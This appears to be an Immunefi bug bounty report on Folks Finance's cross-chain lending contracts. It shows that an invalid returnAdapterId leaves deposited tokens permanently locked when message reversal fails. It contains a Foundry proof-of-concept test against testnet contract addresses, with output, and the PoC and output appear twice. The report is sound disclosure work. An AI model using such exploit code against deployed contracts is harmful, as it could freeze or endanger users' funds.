# Boost \_ Folks Finance 33526 - \[Smart Contract - Insight] Need to check returnAdapterId

## Need to check returnAdapterId

Submitted on Mon Jul 22 2024 11:24:41 GMT-0400 (Atlantic Standard Time) by @cryptoticky for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33526

Report type: Smart Contract

Report severity: Insight

Target: <https://testnet.snowtrace.io/address/0x89df7db4af48Ec7A84DE09F755ade9AF1940420b>

Impacts:

* Permanent freezing of funds

### Description

## Need to check returnAdapterId

### Vulnerability Details

SpokeToken.deposit, SpokeToken.repay, SpokeToken.createloanAndDeposit

When this function is called, it attempts to call the hub.receiveMessage function on the hubChain, which can fail for various reasons.

If this happens, the transferred tokens remain in either the hubPool contract, SpokeGasToken, or SpokeErc20Token contract.

If the BridgeRouterHub.reverseMessage function is then called, the message request is reversed, and the tokens are returned to the user.

However, if the returnAdapterId is incorrect, reversing the message is not possible. As a result, the user's funds remain locked in these contracts.

### Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";
import "../interfaces/ISpokeToken.sol";
import "../interfaces/ISpokeCommon.sol";
import "../interfaces/IHubPool.sol";
import "../interfaces/IHub.sol";
import "../interfaces/IBridgeRouter.sol";
import "../interfaces/ILoanManager.sol";
import "../Messages.sol";
import "./AttackContract.sol";

contract InvalidReturnAdapterId is PoC {
    ISpokeToken public spokeCircleToken = ISpokeToken(0x89df7db4af48Ec7A84DE09F755ade9AF1940420b);
    ISpokeToken public spokeGasToken = ISpokeToken(0xBFf8b4e5f92eDD0A5f72b4b0E23cCa2Cc476ce2a);
    ISpokeCommon public spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
    IHubPool public hubCirclePool = IHubPool(0x1968237f3a7D256D08BcAb212D7ae28fEda72c34);
    IHub public hub = IHub(0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140);
    ILoanManager public loanManager = ILoanManager(0x2cAa1315bd676FbecABFC3195000c642f503f1C9);
    IBridgeRouter public bridgeRouter = IBridgeRouter(0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837);
    IERC20 public constant USDC = IERC20(0x5425890298aed601595a70AB815c96711a31Bc65);

    address public user = 0xF745b439965c66425958159e91E7e04224Fed29D;
    address public attacker = 0x7039BC43b78A7135F82567C1f973BfAa30F5b8Ab;

    IERC20[] private _tokens;

    AttackContract private attackContract;

    uint256 private ONE_USDC = 10 ** 6;

    bytes32 private refAccountId = bytes32("");
    bytes32 private userAccountId = bytes32("user");
    bytes32 private attackerAccountId = bytes32("attacker");
    bytes32 private userLoanId = bytes32("userLoan");
    bytes32 private attackerLoanId = bytes32("attackerLoan");

    bytes32 private constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    Messages.MessageParams private params;

    function setUp() virtual public {
        vm.createSelectFork("avalanche_fuji", 34900000);

        _tokens.push(USDC);

        console.log("\n>>> Initial conditions");
    }


    function testInvalidReturnAdapterId() public snapshot(user, _tokens) {
        vm.startPrank(user);

        params = Messages.MessageParams({
            adapterId: 1,
            returnAdapterId: 2, // invalid return adapter id
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });

        spokeCommon.createAccount(params, userAccountId, refAccountId);
        spokeCommon.createLoan(params, userAccountId, userLoanId, 2, "userLoan");
        uint256 depositAmount = 1_000_000 * ONE_USDC;
        USDC.approve(address(spokeCircleToken), depositAmount);
        bytes32 invalidAccountId = bytes32("invalidAccountId");
        spokeCircleToken.deposit(params, invalidAccountId, userLoanId, depositAmount);
        // this tx is reverted from the Hub.receiveMessage() because of the invalidAccountId
        // and the messageId is "0x9065bc4c42939ccc651aae9cd013c79763f62723c8d6cd903fcdc3f743e56e78"

        // use valid account id to reverse the message
        bytes memory extraArgs = abi.encode(userAccountId);
        bytes32 messageId = 0x9065bc4c42939ccc651aae9cd013c79763f62723c8d6cd903fcdc3f743e56e78;
        bridgeRouter.reverseMessage(1, messageId, extraArgs);
        // it is failed and the user's token locked in hubPool forever.

        vm.stopPrank();
    }
}
```

The result is

```
>>> Initial conditions
  --- USDC balance of [0xf745b439965c66425958159e91e7e04224fed29d]:     2748701800.0 ---
  
  --- USDC balance of [0xf745b439965c66425958159e91e7e04224fed29d]:     2747701800.0 ---
  
  ~~~ Profit for [0xf745b439965c66425958159e91e7e04224fed29d]
  -----------------------------------------------------------------------------------------
               Token address                    |       Symbol  |       Profit
  -----------------------------------------------------------------------------------------
  0x5425890298aed601595a70AB815c96711a31Bc65    |       USDC    |       -1000000.0
  

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 914.80ms

```

### Recommendation

Need to check returnAdapterId in SpokeToken.sol

### Proof of concept

### Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";
import "../interfaces/ISpokeToken.sol";
import "../interfaces/ISpokeCommon.sol";
import "../interfaces/IHubPool.sol";
import "../interfaces/IHub.sol";
import "../interfaces/IBridgeRouter.sol";
import "../interfaces/ILoanManager.sol";
import "../Messages.sol";
import "./AttackContract.sol";

contract InvalidReturnAdapterId is PoC {
    ISpokeToken public spokeCircleToken = ISpokeToken(0x89df7db4af48Ec7A84DE09F755ade9AF1940420b);
    ISpokeToken public spokeGasToken = ISpokeToken(0xBFf8b4e5f92eDD0A5f72b4b0E23cCa2Cc476ce2a);
    ISpokeCommon public spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
    IHubPool public hubCirclePool = IHubPool(0x1968237f3a7D256D08BcAb212D7ae28fEda72c34);
    IHub public hub = IHub(0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140);
    ILoanManager public loanManager = ILoanManager(0x2cAa1315bd676FbecABFC3195000c642f503f1C9);
    IBridgeRouter public bridgeRouter = IBridgeRouter(0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837);
    IERC20 public constant USDC = IERC20(0x5425890298aed601595a70AB815c96711a31Bc65);

    address public user = 0xF745b439965c66425958159e91E7e04224Fed29D;
    address public attacker = 0x7039BC43b78A7135F82567C1f973BfAa30F5b8Ab;

    IERC20[] private _tokens;

    AttackContract private attackContract;

    uint256 private ONE_USDC = 10 ** 6;

    bytes32 private refAccountId = bytes32("");
    bytes32 private userAccountId = bytes32("user");
    bytes32 private attackerAccountId = bytes32("attacker");
    bytes32 private userLoanId = bytes32("userLoan");
    bytes32 private attackerLoanId = bytes32("attackerLoan");

    bytes32 private constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    Messages.MessageParams private params;

    function setUp() virtual public {
        vm.createSelectFork("avalanche_fuji", 34900000);

        _tokens.push(USDC);

        console.log("\n>>> Initial conditions");
    }


    function testInvalidReturnAdapterId() public snapshot(user, _tokens) {
        vm.startPrank(user);

        params = Messages.MessageParams({
            adapterId: 1,
            returnAdapterId: 2, // invalid return adapter id
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });

        spokeCommon.createAccount(params, userAccountId, refAccountId);
        spokeCommon.createLoan(params, userAccountId, userLoanId, 2, "userLoan");
        uint256 depositAmount = 1_000_000 * ONE_USDC;
        USDC.approve(address(spokeCircleToken), depositAmount);
        bytes32 invalidAccountId = bytes32("invalidAccountId");
        spokeCircleToken.deposit(params, invalidAccountId, userLoanId, depositAmount);
        // this tx is reverted from the Hub.receiveMessage() because of the invalidAccountId
        // and the messageId is "0x9065bc4c42939ccc651aae9cd013c79763f62723c8d6cd903fcdc3f743e56e78"

        // use valid account id to reverse the message
        bytes memory extraArgs = abi.encode(userAccountId);
        bytes32 messageId = 0x9065bc4c42939ccc651aae9cd013c79763f62723c8d6cd903fcdc3f743e56e78;
        bridgeRouter.reverseMessage(1, messageId, extraArgs);
        // it is failed and the user's token locked in hubPool forever.

        vm.stopPrank();
    }
}
```

The result is

```
>>> Initial conditions
  --- USDC balance of [0xf745b439965c66425958159e91e7e04224fed29d]:     2748701800.0 ---
  
  --- USDC balance of [0xf745b439965c66425958159e91e7e04224fed29d]:     2747701800.0 ---
  
  ~~~ Profit for [0xf745b439965c66425958159e91e7e04224fed29d]
  -----------------------------------------------------------------------------------------
               Token address                    |       Symbol  |       Profit
  -----------------------------------------------------------------------------------------
  0x5425890298aed601595a70AB815c96711a31Bc65    |       USDC    |       -1000000.0
  

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 914.80ms

```
